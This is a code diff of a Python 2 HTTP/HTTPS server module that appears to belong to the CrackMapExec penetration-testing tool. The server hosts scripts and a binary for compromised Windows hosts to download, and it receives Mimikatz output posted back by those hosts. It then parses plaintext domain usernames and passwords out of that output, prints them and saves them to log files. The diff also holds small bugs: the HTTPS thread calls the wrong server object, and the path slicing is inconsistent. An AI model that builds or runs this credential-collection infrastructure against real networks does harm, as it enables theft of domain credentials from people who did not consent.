@@ -2,10 +2,16 @@ from BaseHTTPServer import BaseHTTPRequestHandler
 from threading import Thread
 from core.logger import *
 from datetime import datetime
+from StringIO import StringIO
+import core.settings as settings
+import os
 import BaseHTTPServer
 import ssl
 
 class MimikatzServer(BaseHTTPRequestHandler):
+
+    def log_message(self, format, *args):
+        print_message("%s - - %s" % (self.client_address[0], format%args))
 
     def do_GET(self):
         if self.path[5:] in os.listdir('hosted'):
@@ -14,11 +20,11 @@ class MimikatzServer(BaseHTTPRequestHandler):
             with open('hosted/'+ self.path[4:], 'r') as script:
                 self.wfile.write(script.read())
 
-        elif args.path:
-            if self.path[6:] == args.path.split('/')[-1]:
+        elif settings.args.path:
+            if self.path[6:] == settings.args.path.split('/')[-1]:
                 self.send_response(200)
                 self.end_headers()
-                with open(args.path, 'rb') as rbin:
+                with open(settings.args.path, 'rb') as rbin:
                     self.wfile.write(rbin.read())
 
         else:
@@ -31,19 +37,19 @@ class MimikatzServer(BaseHTTPRequestHandler):
         length = int(self.headers.getheader('content-length'))
         data = self.rfile.read(length)
 
-        if args.mimikatz:
-            buf = StringIO.StringIO(data).readlines()
+        if settings.args.mimikatz:
+            buf = StringIO(data).readlines()
             i = 0
             while i < len(buf):
                 if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                     passw  = buf[i].split(':')[1].strip()
-                    if len(passw) != 719:
+                    if len(passw) != 719: #Sometimes mimikatz gives long hexstrings instead of clear text passwords
                         domain = buf[i-1].split(':')[1].strip()
                         user   = buf[i-2].split(':')[1].strip()
                         print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
                 i += 1
 
-        elif args.mimi_cmd:
+        elif settings.args.mimi_cmd:
             print data
 
         log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
@@ -51,13 +57,13 @@ class MimikatzServer(BaseHTTPRequestHandler):
             creds.write(data)
         print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
 
-def http_server(self):
+def http_server():
     http_server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
     t = Thread(name='http_server', target=http_server.serve_forever)
     t.setDaemon(True)
     t.start()
 
-def https_server(self):
+def https_server():
     server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
     server.socket = ssl.wrap_socket(server.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
     t = Thread(name='https_server', target=http_server.serve_forever)
